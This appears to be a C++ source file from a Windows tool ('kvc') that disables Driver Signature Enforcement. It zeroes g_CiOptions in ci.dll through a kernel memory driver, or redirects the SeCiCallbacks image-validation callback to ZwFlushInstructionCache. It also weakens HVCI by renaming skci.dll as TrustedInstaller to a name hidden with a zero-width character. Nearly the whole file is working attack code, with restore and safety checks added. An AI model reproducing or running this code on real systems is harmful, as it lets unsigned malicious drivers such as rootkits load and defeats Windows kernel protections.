// DSEResearch.cpp
// Unified DSE Research Manager.
// g_CiOptions location is handled by CiOptionsFinder (semantic probe + build fallback).
// Standard method: g_CiOptions write + HVCI bypass via skci.dll rename.
// Safe method:     PDB-based SeCiCallbacks patching (preserves VBS).

#include "DSEBypass.h"
#include "TrustedInstallerIntegrator.h"
#include "common.h"
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// ============================================================================
// CONSTANTS
// ============================================================================

static constexpr DWORD64 CALLBACK_OFFSET = 0x20; // SeCiCallbacks callback offset

// ============================================================================
// KERNEL MODULE STRUCTURES
// ============================================================================

typedef struct _SYSTEM_MODULE {
    ULONG_PTR Reserved1;
    ULONG_PTR Reserved2;
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    USHORT    LoadOrderIndex;
    USHORT    InitOrderIndex;
    USHORT    LoadCount;
    USHORT    PathLength;
    CHAR      ImageName[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG         Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

// ============================================================================
// CONSTRUCTION
// ============================================================================

DSEBypass::DSEBypass(std::unique_ptr<kvc>& driver, TrustedInstallerIntegrator* ti)
    : m_driver(driver)
    , m_trustedInstaller(ti)
    , m_ciFinder(driver)
{
    DEBUG(L"DSEBypass initialized");
}

// ============================================================================
// PUBLIC INTERFACE - METHOD DISPATCH
// ============================================================================

bool DSEBypass::Disable(Method method) noexcept {
    switch (method) {
        case Method::Standard: return DisableStandard();
        case Method::Safe:     return DisableSafe();
        default:
            ERROR(L"Unknown DSE bypass method");
            return false;
    }
}

bool DSEBypass::Restore(Method method) noexcept {
    switch (method) {
        case Method::Standard: return RestoreStandard();
        case Method::Safe:     return RestoreSafe();
        default:
            ERROR(L"Unknown DSE restore method");
            return false;
    }
}

// ============================================================================
// STATUS AND DIAGNOSTICS
// ============================================================================

bool DSEBypass::GetStatus(Status& outStatus) noexcept {
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }

    ULONG_PTR ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }

    auto current = m_driver->Read32(ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }

    DWORD value = current.value();

    outStatus.CiOptionsAddress = ciOptionsAddr;
    outStatus.CiOptionsValue   = value;
    outStatus.DSEEnabled       = (value & 0x6) != 0;

    // HVCI detection: g_CiOptions bits first, registry fallback for 26H1+.
    bool hvciByBits = IsHVCIEnabled(value);
    bool hvciByReg  = !hvciByBits && CheckHVCIRegistry();
    outStatus.HVCIEnabled = hvciByBits || hvciByReg;
    if (hvciByReg) {
        DEBUG(L"HVCI not in g_CiOptions (0x%08X) but registry confirms HVCI active", value);
    }

    outStatus.SavedCallback = SessionManager::GetOriginalCiCallback();

    m_ciOptionsAddr    = ciOptionsAddr;
    m_originalCiOptions = value;

    return true;
}

// static
bool DSEBypass::CheckHVCIRegistry() noexcept {
    // Primary: SecurityServicesRunning bit 2 = HVCI running at boot.
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Status",
                      0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 0, sz = sizeof(DWORD);
        LONG res = RegQueryValueExW(hKey, L"SecurityServicesRunning", nullptr, nullptr,
                                    reinterpret_cast<LPBYTE>(&val), &sz);
        RegCloseKey(hKey);
        if (res == ERROR_SUCCESS && (val & 0x4)) {
            DEBUG(L"HVCI confirmed via SecurityServicesRunning: 0x%08X", val);
            return true;
        }
    }

    // Fallback: scenario Running key set at boot when HVCI is active.
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"
                      L"\\Scenarios\\HypervisorEnforcedCodeIntegrity",
                      0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD running = 0, sz = sizeof(DWORD);
        RegQueryValueExW(hKey, L"Running", nullptr, nullptr,
                         reinterpret_cast<LPBYTE>(&running), &sz);
        RegCloseKey(hKey);
        if (running != 0) {
            DEBUG(L"HVCI confirmed via scenario Running key: %d", running);
            return true;
        }
    }

    return false;
}

DSEBypass::DSEState DSEBypass::CheckSafeMethodState() noexcept {
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        return DSEState::UNKNOWN;
    }

    auto [kernelBase, kernelPath] = *kernelInfo;

    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        return DSEState::UNKNOWN;
    }

    auto [offSeCi, offZwFlush] = *offsets;

    DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
    DWORD64 safeFunction  = kernelBase + offZwFlush;

    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        return DSEState::UNKNOWN;
    }

    if (*current == safeFunction) {
        return DSEState::PATCHED;
    }

    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0 && *current == original) {
        return DSEState::NORMAL;
    }

    return DSEState::CORRUPTED;
}

std::wstring DSEBypass::GetDSEStateString(DSEState state) {
    switch (state) {
        case DSEState::NORMAL:    return L"NORMAL (DSE enabled)";
        case DSEState::PATCHED:   return L"PATCHED (DSE disabled)";
        case DSEState::CORRUPTED: return L"CORRUPTED (unknown callback)";
        default:                  return L"UNKNOWN (no data)";
    }
}

// ============================================================================
// STANDARD METHOD - g_CiOptions PATCHING
// ============================================================================

bool DSEBypass::DisableStandard() noexcept {
    DEBUG(L"Attempting to disable DSE using Standard method...");

    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }

    DEBUG(L"ci.dll base: 0x%llX", ciBase.value());

    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }

    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);

    auto current = m_driver->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }

    DWORD currentValue  = current.value();
    m_originalCiOptions = currentValue;
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);

    if (currentValue == 0x00000000) {
        INFO(L"DSE already disabled - no action required");
        SUCCESS(L"Kernel accepts unsigned drivers");
        return true;
    }

    // Fail closed before the generic RTC write. On current Windows builds,
    // KMCI bit 0x4000 can coincide with CiPolicy being mapped read-only even
    // when the narrower HVCI test and registry checks do not identify HVCI.
    // Attempting the write in that state caused bugcheck 0xBE.
    const bool protectedCiMode =
        IsDirectCiPatchUnsafe(currentValue) || CheckHVCIRegistry();
    if (protectedCiMode) {
        ERROR(L"FAIL CLOSED: g_CiOptions 0x%08X indicates a protected CI mode",
              currentValue);
        ERROR(L"Direct RTC writes to the CiPolicy page are blocked to prevent bugcheck 0xBE");
        INFO(L"Read-only diagnosis: 'kvc dse inspect-address <ci-base> <candidate>'");
        return false;
    }

    if (currentValue != 0x00000006) {
        INFO(L"g_CiOptions: 0x%08X (extra CI flags, no HVCI) - patching directly",
             currentValue);
        INFO(L"Note: 'kvc dse off --safe' is available as a non-invasive alternative");
    }

    if (!SessionManager::SaveOriginalCiOptions(currentValue)) {
        ERROR(L"Refusing to disable DSE without a recoverable original state");
        return false;
    }

    DWORD newValue = 0x00000000;

    if (!m_driver->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }

    auto verify = m_driver->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)",
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }

    SUCCESS(L"Driver signature enforcement is off");
    INFO(L"No restart required - unsigned drivers can now be loaded");
    return true;
}

bool DSEBypass::RestoreStandard() noexcept {
    DEBUG(L"Attempting to restore DSE using Standard method...");

    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }

    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }

    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);

    auto current = m_driver->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }

    DWORD currentValue = current.value();
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);

    if ((currentValue & 0x6) != 0) {
        INFO(L"DSE already enabled (g_CiOptions = 0x%08X) - no action required",
             currentValue);
        SUCCESS(L"Driver signature enforcement is active");
        return true;
    }

    if (currentValue != 0x00000000) {
        INFO(L"DSE restore failed: g_CiOptions = 0x%08X (expected: 0x00000000)",
             currentValue);
        INFO(L"Use 'kvc dse' to check current protection status");
        return false;
    }

    auto savedOriginal = SessionManager::GetOriginalCiOptions();
    if (!savedOriginal) {
        ERROR(L"No original g_CiOptions value is available for this boot session");
        ERROR(L"Refusing to guess a restore value; reboot to recover Windows boot policy");
        return false;
    }

    DWORD newValue = *savedOriginal;
    if ((newValue & 0x6) == 0) {
        ERROR(L"Saved g_CiOptions value 0x%08X does not represent enabled DSE", newValue);
        ERROR(L"Refusing to restore an invalid policy value");
        return false;
    }

    if (!m_driver->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }

    auto verify = m_driver->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)",
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }

    SessionManager::ClearOriginalCiOptions();

    SUCCESS(L"Driver signature enforcement is on (0x%08X -> 0x%08X)",
            currentValue, newValue);
    INFO(L"Kernel protection reactivated - no restart required");
    return true;
}

// ============================================================================
// STANDARD METHOD - HVCI BYPASS (skci.dll manipulation)
// ============================================================================

bool DSEBypass::RenameSkciLibrary() noexcept {
    DEBUG(L"Attempting to rename skci.dll to disable hypervisor");

    if (!m_trustedInstaller) {
        ERROR(L"TrustedInstaller not available");
        return false;
    }

    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }

    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dll";
    std::wstring dstPath = std::wstring(sysDir) + L"\\skci\u200B.dll";

    DEBUG(L"Rename: %s -> %s", srcPath.c_str(), dstPath.c_str());

    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
        ERROR(L"Failed to rename skci.dll (TrustedInstaller operation failed)");
        return false;
    }

    SUCCESS(L"Windows hypervisor services temporarily suspended");
    return true;
}

bool DSEBypass::RestoreSkciLibrary() noexcept {
    DEBUG(L"Restoring skci.dll");

    if (!m_trustedInstaller) {
        ERROR(L"TrustedInstaller not available");
        return false;
    }

    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }

    std::wstring srcPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dll";

    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
        DWORD error = GetLastError();
        ERROR(L"Failed to restore skci.dll (error: %d)", error);
        return false;
    }

    SUCCESS(L"skci.dll restored successfully");
    return true;
}

bool DSEBypass::CreatePendingFileRename() noexcept {
    DEBUG(L"Creating PendingFileRenameOperations for skci.dll restore");

    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }

    std::wstring srcPath = std::wstring(L"\\??\\") + sysDir + L"\\skci\u200B.dll";
    std::wstring dstPath = std::wstring(L"\\??\\") + sysDir + L"\\skci.dll";

    std::vector<wchar_t> multiString;
    multiString.insert(multiString.end(), srcPath.begin(), srcPath.end());
    multiString.push_back(L'\0');
    multiString.insert(multiString.end(), dstPath.begin(), dstPath.end());
    multiString.push_back(L'\0');
    multiString.push_back(L'\0'); // REG_MULTI_SZ terminator

    RegKeyGuard key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
                      0, KEY_WRITE, key.addressof()) != ERROR_SUCCESS) {
        ERROR(L"Failed to open Session Manager key");
        return false;
    }

    LONG result = RegSetValueExW(
        key.get(), L"PendingFileRenameOperations", 0, REG_MULTI_SZ,
        reinterpret_cast<const BYTE*>(multiString.data()),
        static_cast<DWORD>(multiString.size() * sizeof(wchar_t)));

    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set PendingFileRenameOperations (error: %d)", result);
        return false;
    }

    DWORD allowFlag = 1;
    result = RegSetValueExW(key.get(), L"AllowProtectedRenames", 0, REG_DWORD,
                            reinterpret_cast<const BYTE*>(&allowFlag), sizeof(DWORD));

    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set AllowProtectedRenames (error: %d)", result);
        return false;
    }

    DEBUG(L"PendingFileRenameOperations: %s -> %s", srcPath.c_str(), dstPath.c_str());
    SUCCESS(L"File restore will be performed automatically by Windows on next boot");
    return true;
}

// ============================================================================
// SAFE METHOD - SeCiCallbacks PATCHING (PDB-based)
// ============================================================================

bool DSEBypass::DisableSafe() noexcept {
    INFO(L"Starting Safe DSE Bypass (SeCiCallbacks method)...");

    std::wstring currentLCUVer = GetCurrentLCUVersion();
    if (!currentLCUVer.empty()) {
        INFO(L"Current LCUVersion: %s", currentLCUVer.c_str());
    }

    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"Failed to get kernel information");
        return false;
    }

    auto [kernelBase, kernelPath] = *kernelInfo;
    INFO(L"Current Kernel Base: 0x%llX", kernelBase);

    INFO(L"Resolving symbols from PDB...");
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        ERROR(L"Failed to get symbol offsets");
        return false;
    }

    auto [offSeCi, offZwFlush] = *offsets;

    if (!ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
        ERROR(L"Offset validation failed");
        return false;
    }

    DWORD64 seciBase      = kernelBase + offSeCi;
    DWORD64 targetAddress = seciBase + CALLBACK_OFFSET;
    DWORD64 safeFunction  = kernelBase + offZwFlush;

    DEBUG(L"Kernel base: 0x%llX", kernelBase);
    DEBUG(L"SeCi offset: 0x%llX", offSeCi);
    DEBUG(L"ZwFlush offset: 0x%llX", offZwFlush);
    DEBUG(L"SeCiCallbacks base: 0x%llX", seciBase);
    DEBUG(L"Target address: 0x%llX", targetAddress);
    DEBUG(L"Safe function: 0x%llX", safeFunction);

    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        ERROR(L"Failed to read current kernel callback at 0x%llX", targetAddress);
        ERROR(L"Possible causes: Invalid address, driver not loaded, or memory protected");
        return false;
    }

    DEBUG(L"Current callback value: 0x%llX", *current);

    if (*current == safeFunction) {
        auto savedOriginal = SessionManager::GetOriginalCiCallback();
        if (savedOriginal == 0) {
            ERROR(L"DSE is already patched, but the exact original callback is unavailable");
            ERROR(L"Refusing to record the patched callback as the original state");
            return false;
        }
        SUCCESS(L"DSE is already disabled (Safe Mode)");
        SUCCESS(L"State: PATCHED (ZwFlush callback active)");
        return true;
    }

    if (*current < 0xFFFFF80000000000ULL) {
        ERROR(L"Current value is not a valid kernel function address");
        ERROR(L"Value: 0x%llX (expected >= 0xFFFFF80000000000)", *current);
        ERROR(L"Target address calculation may be incorrect");
        return false;
    }

    auto savedOriginal = SessionManager::GetOriginalCiCallback();
    if (savedOriginal != 0 && *current == savedOriginal) {
        INFO(L"Current callback matches saved original");
        INFO(L"State: NORMAL (DSE enabled)");
        INFO(L"Proceeding with patch...");
    }

    if (!SessionManager::SaveOriginalCiCallback(*current)) {
        ERROR(L"Refusing to patch DSE without a recoverable original callback");
        return false;
    }
    DEBUG(L"Saved original callback: 0x%llX", *current);

    if (ApplyCallbackPatch(targetAddress, safeFunction, *current))
        return true;

    // The patch operation either did not write or attempted to roll back. Only
    // discard the transaction record when the live value is exactly original.
    auto afterFailure = m_driver->Read64(targetAddress);
    if (afterFailure && *afterFailure == *current)
        SessionManager::ClearOriginalCiCallback();
    return false;
}

bool DSEBypass::RestoreSafe() noexcept {
    INFO(L"Restoring DSE configuration (Safe method)...");

    std::wstring currentLCUVer = GetCurrentLCUVersion();
    if (!currentLCUVer.empty()) {
        INFO(L"Current LCUVersion: %s", currentLCUVer.c_str());
    }

    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"Failed to get kernel information");
        return false;
    }

    auto [kernelBase, kernelPath] = *kernelInfo;
    INFO(L"Current Kernel Base: 0x%llX", kernelBase);

    INFO(L"Resolving symbols from PDB...");
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        ERROR(L"Failed to get symbol offsets");
        return false;
    }

    auto [offSeCi, offZwFlush] = *offsets;

    if (!ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
        ERROR(L"Offset validation failed");
        return false;
    }

    DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
    DWORD64 safeFunction  = kernelBase + offZwFlush;

    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        ERROR(L"Failed to read kernel callback at 0x%llX", targetAddress);
        return false;
    }

    DEBUG(L"Current value at 0x%llX: 0x%llX", targetAddress, *current);
    DEBUG(L"Safe function (ZwFlush): 0x%llX", safeFunction);

    if (*current == safeFunction) {
        auto original = SessionManager::GetOriginalCiCallback();
        if (original == 0) {
            ERROR(L"DSE is DISABLED (patched)");
            ERROR(L"No original callback saved - cannot restore");
            ERROR(L"State: PATCHED (restoration impossible)");
            return false;
        }
        INFO(L"DSE is DISABLED (patched)");
        INFO(L"Original callback available: 0x%llX", original);
        INFO(L"Proceeding with restoration...");
    }

    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0 && *current == original) {
        SUCCESS(L"DSE is already RESTORED");
        SUCCESS(L"Current callback matches saved original");
        SUCCESS(L"State: NORMAL (DSE enabled)");
        SessionManager::ClearOriginalCiCallback();
        return true;
    }

    if (original == 0 && *current != safeFunction) {
        INFO(L"DSE appears to be in NORMAL state");
        INFO(L"No patch detected, no saved state");
        INFO(L"State: NORMAL (or unknown, no cache)");
        return true;
    }

    if (original == 0 && *current == safeFunction) {
        ERROR(L"DSE is DISABLED but no original callback saved");
        ERROR(L"State: PATCHED (cannot restore - no saved state)");
        return false;
    }

    if (*current != safeFunction) {
        ERROR(L"Current callback does not match either the saved original or the known patch value");
        ERROR(L"Refusing to overwrite unexpected kernel state (current: 0x%llX)", *current);
        return false;
    }

    INFO(L"Current state: PATCHED");
    INFO(L"Current callback: 0x%llX (ZwFlush)", *current);
    INFO(L"Restoring to original: 0x%llX", original);

    if (RestoreCallbackPatch(targetAddress, original)) {
        SessionManager::ClearOriginalCiCallback();
        SUCCESS(L"DSE RESTORED successfully");
        SUCCESS(L"State changed: PATCHED -> NORMAL");
        DEBUG(L"Cleared completed DSE transaction state");
        return true;
    }

    ERROR(L"Failed to restore kernel callback");
    return false;
}

// ============================================================================
// SAFE METHOD - PATCH OPERATIONS
// ============================================================================

bool DSEBypass::ApplyCallbackPatch(DWORD64 targetAddress,
                                   DWORD64 safeFunction,
                                   DWORD64 originalCallback) noexcept {
    INFO(L"Patching CiValidateImageHeader callback");
    INFO(L"SeCiCallbacks base: 0x%llX", targetAddress - CALLBACK_OFFSET);
    INFO(L"Callback offset: +0x%llX", CALLBACK_OFFSET);
    INFO(L"Target address: 0x%llX", targetAddress);
    INFO(L"Original: 0x%llX", originalCallback);
    INFO(L"Patch to: 0x%llX (ZwFlushInstructionCache)", safeFunction);

    if (m_driver->Write64(targetAddress, safeFunction)) {
        auto verify = m_driver->Read64(targetAddress);
        if (verify && *verify == safeFunction) {
            SUCCESS(L"DSE disabled successfully via SeCiCallbacks");
            SUCCESS(L"Kernel callback redirected to ZwFlushInstructionCache");
            SUCCESS(L"State: NORMAL -> PATCHED");
            return true;
        }
        ERROR(L"Patch verification failed");
        m_driver->Write64(targetAddress, originalCallback);
        return false;
    }

    ERROR(L"Failed to write to kernel memory");
    return false;
}

bool DSEBypass::RestoreCallbackPatch(DWORD64 targetAddress,
                                     DWORD64 originalCallback) noexcept {
    INFO(L"Restoring original kernel callback...");
    INFO(L"Target: 0x%llX", targetAddress);
    INFO(L"Restore value: 0x%llX", originalCallback);

    if (m_driver->Write64(targetAddress, originalCallback)) {
        auto verify = m_driver->Read64(targetAddress);
        if (verify && *verify == originalCallback) {
            SUCCESS(L"Kernel callback restored successfully");
            return true;
        }
        ERROR(L"Restoration verification failed");
        return false;
    }

    ERROR(L"Failed to restore kernel callback");
    return false;
}

bool DSEBypass::ValidateOffsets(DWORD64 offSeCi,
                                DWORD64 offZwFlush,
                                DWORD64 /*kernelBase*/) noexcept {
    if (offSeCi == 0 || offZwFlush == 0) {
        ERROR(L"Invalid offsets (zero)");
        return false;
    }
    if (offSeCi > 0xFFFFFF || offZwFlush > 0xFFFFFF) {
        ERROR(L"Suspiciously large offsets");
        return false;
    }
    if (offSeCi >= offZwFlush) {
        INFO(L"SeCiCallbacks offset >= ZwFlush offset (unusual)");
    }

    DEBUG(L"Offsets validated: SeCi=0x%llX, ZwFlush=0x%llX", offSeCi, offZwFlush);
    return true;
}

// ============================================================================
// SAFE METHOD - KERNEL INFORMATION
// ============================================================================

std::optional<std::pair<DWORD64, std::wstring>> DSEBypass::GetKernelInfo() noexcept {
    LPVOID drivers[1024];
    DWORD  needed;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        ERROR(L"Failed to enumerate device drivers: %d", GetLastError());
        return std::nullopt;
    }

    DWORD64 kernelBase = reinterpret_cast<DWORD64>(drivers[0]);

    wchar_t kernelPath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(drivers[0], kernelPath, MAX_PATH)) {
        ERROR(L"Failed to get kernel path: %d", GetLastError());
        return std::nullopt;
    }

    std::wstring ntPath = kernelPath;
    std::wstring dosPath;

    if (ntPath.find(L"\\SystemRoot\\") == 0) {
        wchar_t winDir[MAX_PATH];
        GetWindowsDirectoryW(winDir, MAX_PATH);
        dosPath = std::wstring(winDir) + ntPath.substr(11);
    } else if (ntPath.find(L"\\??\\") == 0) {
        dosPath = ntPath.substr(4);
    } else {
        dosPath = ntPath;
    }

    DEBUG(L"Kernel base: 0x%llX, path: %s", kernelBase, dosPath.c_str());
    return std::make_pair(kernelBase, dosPath);
}

std::wstring DSEBypass::GetCurrentLCUVersion() noexcept {
    std::wstring lcuVer;

    RegKeyGuard key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ | KEY_WOW64_64KEY, key.addressof()) == ERROR_SUCCESS) {
        wchar_t buffer[256] = {0};
        DWORD size = sizeof(buffer);
        DWORD type = 0;

        if (RegQueryValueExW(key.get(), L"LCUVer", nullptr, &type,
                             reinterpret_cast<BYTE*>(buffer), &size) == ERROR_SUCCESS &&
            type == REG_SZ) {
            lcuVer = buffer;
        } else {
            DEBUG(L"LCUVer not found in registry");
        }
    }

    return lcuVer;
}

// ============================================================================
// KERNEL MODULE HELPERS
// ============================================================================

ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
    return m_ciFinder.FindCiOptions(ciBase);
}

std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        ERROR(L"Failed to get ntdll.dll handle");
        return std::nullopt;
    }

    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    auto pNtQuerySystemInformation = reinterpret_cast<NTQUERYSYSTEMINFORMATION>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));

    if (!pNtQuerySystemInformation) {
        ERROR(L"Failed to get NtQuerySystemInformation");
        return std::nullopt;
    }

    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(
        11, nullptr, 0, &bufferSize); // SystemModuleInformation

    if (status != 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
        ERROR(L"NtQuerySystemInformation failed: 0x%08X", status);
        return std::nullopt;
    }

    auto buffer  = std::make_unique<BYTE[]>(bufferSize);
    auto modules = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.get());

    status = pNtQuerySystemInformation(11, modules, bufferSize, &bufferSize);
    if (status != 0) {
        ERROR(L"NtQuerySystemInformation failed (2nd call): 0x%08X", status);
        return std::nullopt;
    }

    for (ULONG i = 0; i < modules->Count; i++) {
        auto& mod = modules->Modules[i];

        const char* fileName = strrchr(mod.ImageName, '\\');
        if (fileName) {
            fileName++;
        } else {
            fileName = mod.ImageName;
        }

        if (_stricmp(fileName, moduleName) == 0) {
            ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);

            if (baseAddr == 0) {
                ERROR(L"Module %S found but ImageBase is NULL", moduleName);
                continue;
            }

            DEBUG(L"Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
            return baseAddr;
        }
    }

    ERROR(L"Module %S not found in kernel", moduleName);
    return std::nullopt;
}
